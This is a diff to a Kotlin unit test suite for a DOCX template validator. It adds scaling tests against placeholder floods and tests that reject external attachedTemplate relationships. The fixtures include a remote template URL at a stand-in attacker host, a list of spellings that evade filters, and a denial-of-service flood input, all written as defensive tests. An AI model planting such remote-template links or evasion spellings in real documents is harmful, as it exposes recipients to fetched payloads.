@@ -266,22 +266,110 @@ class RequirementExportTemplateValidationServiceTest {
     fun `a document full of placeholder openers does not stall validation`() {
         // Each split-placeholder probe copies a window and runs a regex over it. Unbounded, a
         // document of repeated "${" turns one upload into tens of GB of work, so the probe count
-        // is capped. This asserts the cap holds: without it the call does not return promptly.
-        val hostile = docxTemplate("\${".repeat(200_000))
+        // is capped.
+        //
+        // The assertion is scaling, not wall-clock: an absolute millisecond budget passes on a
+        // fast runner even with no cap at all, which is exactly how the first version of this
+        // test gave false assurance. With the cap, work is constant past the cap, so a 10x
+        // larger flood costs about the same; without it the cost is quadratic in the flood size.
+        val small = docxTemplate("\${".repeat(20_000))
+        val large = docxTemplate("\${".repeat(200_000))
 
+        val smallNanos = timeValidation(small)
+        val largeNanos = timeValidation(large)
+
+        // Generous factor: the zip walk and sha256 still scale linearly with document size, and
+        // a 10x uncapped probe loop would be ~100x, far outside this.
+        assertThat(largeNanos)
+            .describedAs("probe work must be capped, not proportional to the flood size")
+            .isLessThan(maxOf(smallNanos * 20, 2_000_000_000L))
+    }
+
+    private fun timeValidation(bytes: ByteArray): Long {
         val start = System.nanoTime()
         val report = service.validate(
-            bytes = hostile,
+            bytes = bytes,
             filename = "corporate-template.docx",
             contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE,
             requireRequirementsPlaceholder = false
         )
-        val elapsedMillis = (System.nanoTime() - start) / 1_000_000
-
         assertThat(report.sha256).isNotEmpty()
-        assertThat(elapsedMillis)
-            .describedAs("validation must stay bounded on a placeholder-opener flood")
-            .isLessThan(10_000)
+        return System.nanoTime() - start
+    }
+
+    @Test
+    fun `an external relationship target is rejected however it is spelled`() {
+        // This is a security control, not hygiene: an external attachedTemplate relationship is
+        // fetched by the recipient's Word on open. All of these are legal XML that Word resolves
+        // to External, and a plain substring check missed every variant but the first.
+        val spellings = listOf(
+            """TargetMode="External"""" to "canonical double-quoted",
+            """TargetMode='External'""" to "single-quoted",
+            """TargetMode = "External"""" to "whitespace around the equals sign",
+            """TargetMode="&#69;xternal"""" to "decimal character reference",
+            """TargetMode="&#x45;xternal"""" to "hex character reference",
+            """targetmode="external"""" to "lower case"
+        )
+
+        for ((attribute, label) in spellings) {
+            val report = service.validate(
+                bytes = withReplacedZipEntry(
+                    docxTemplate("${'$'}{requirements}"),
+                    "word/_rels/document.xml.rels",
+                    """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                       <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                         <Relationship Id="rId9"
+                                       Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                                       Target="https://attacker.example/payload.dotx" $attribute/>
+                       </Relationships>""".toByteArray()
+                ),
+                filename = "corporate-template.docx",
+                contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
+            )
+
+            assertThat(report.valid).describedAs("must reject: $label").isFalse()
+            assertThat(report.errors)
+                .describedAs("must reject: $label")
+                .contains("External links, remote images, and remote templates are not allowed.")
+        }
+    }
+
+    @Test
+    fun `an internal relationship target is not mistaken for an external one`() {
+        val report = service.validate(
+            bytes = withReplacedZipEntry(
+                docxTemplate("${'$'}{requirements}"),
+                "word/_rels/document.xml.rels",
+                """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                   <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                     <Relationship Id="rId1"
+                                   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
+                                   Target="styles.xml" TargetMode="Internal"/>
+                   </Relationships>""".toByteArray()
+            ),
+            filename = "corporate-template.docx",
+            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE
+        )
+
+        assertThat(report.errors)
+            .doesNotContain("External links, remote images, and remote templates are not allowed.")
+    }
+
+    @Test
+    fun `a requirements marker split across two paragraphs is not treated as an insertion point`() {
+        // The renderer joins runs within one paragraph, so a marker spanning a paragraph boundary
+        // is one it will never find. Accepting it would pass validation and then silently append
+        // at the end of the document instead of rendering at the marker.
+        val split = docxTemplate("\${requi", "rements}")
+
+        val report = service.validate(
+            bytes = split,
+            filename = "corporate-template.docx",
+            contentType = RequirementExportTemplateValidationService.DOCX_MEDIA_TYPE,
+            requireRequirementsPlaceholder = true
+        )
+
+        assertThat(report.valid).isFalse()
     }
 
     @Test
@@ -291,9 +379,10 @@ class RequirementExportTemplateValidationServiceTest {
         assertThat(service.sha256(bytes)).isNotEqualTo(service.sha256(docxTemplate("${'$'}{requirements} v2")))
     }
 
-    private fun docxTemplate(text: String): ByteArray {
+    /** One body paragraph per supplied line. */
+    private fun docxTemplate(vararg lines: String): ByteArray {
         val document = XWPFDocument()
-        document.createParagraph().createRun().setText(text)
+        lines.forEach { document.createParagraph().createRun().setText(it) }
         val output = ByteArrayOutputStream()
         document.write(output)
         document.close()
